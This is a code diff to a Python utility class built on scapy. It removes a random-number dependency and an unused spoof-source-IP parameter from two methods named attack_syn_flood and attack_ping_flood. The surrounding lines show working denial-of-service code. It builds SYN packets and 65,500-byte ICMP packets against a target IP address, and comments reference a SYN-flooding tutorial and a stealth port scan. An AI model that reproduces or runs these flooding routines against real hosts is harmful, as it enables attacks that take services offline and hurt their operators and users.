@@ -3,15 +3,10 @@ from scapy.packet import Raw
 from scapy.sendrecv import send, sr, sr1
 from scapy.volatile import RandShort
 from injectable import injectable, autowired, Autowired
-from tekleo_common_utils import UtilsRandom
 
 
 @injectable
 class UtilsScapy:
-    @autowired
-    def __init__(self, utils_random: Autowired(UtilsRandom)):
-        self.utils_random = utils_random
-
     # Scanning
     #-------------------------------------------------------------------------------------------------------------------
     # This utilizes TCP stealth scan
@@ -58,7 +53,7 @@ class UtilsScapy:
     #-------------------------------------------------------------------------------------------------------------------
     # A SYN flood attack is a common form of a denial of service attack in which an attacker sends a sequence of SYN requests to the target system
     # https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
-    def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4, spoof_source_ip: bool = True) -> bool:
+    def attack_syn_flood(self, target_ip_address: str, target_port: int, number_of_packets_to_send: int = 1024, size_of_packet: int = 1024 * 4) -> bool:
         ip = IP(dst=target_ip_address)
         tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
         raw = Raw(b"X" * size_of_packet)
@@ -67,7 +62,7 @@ class UtilsScapy:
         print('UtilsScapy.attack_syn_flood(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))
         return True
 
-    def attack_ping_flood(self, target_ip_address: str, number_of_packets_to_send: int = 3, size_of_packet: int = 65500, spoof_source_ip: bool = True) -> bool:
+    def attack_ping_flood(self, target_ip_address: str, number_of_packets_to_send: int = 3, size_of_packet: int = 65500) -> bool:
         ip = IP(dst=target_ip_address)
         icmp = ICMP()
         raw = Raw(b"X" * size_of_packet)
